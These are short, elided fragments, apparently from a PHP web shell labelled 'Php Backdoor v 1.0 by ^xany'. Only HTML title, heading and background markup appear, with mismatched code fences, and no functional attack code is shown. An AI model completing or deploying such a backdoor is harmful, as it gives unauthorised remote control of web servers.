...
```php
echo '<html>';
echo '<head><title>Php Backdoor v 1.0 by ^xany</title></head>';
...
echo '<h1>PHP Backdoor by xany</h1><br><br>';
```
```php
...
```html
<HTML>
<BODY text="#FFFFFF" bgcolor="#000000" style="background-image:url(http://newevolutiondesigns.com/images/freebies/black-wallpaper-7.jpg)">
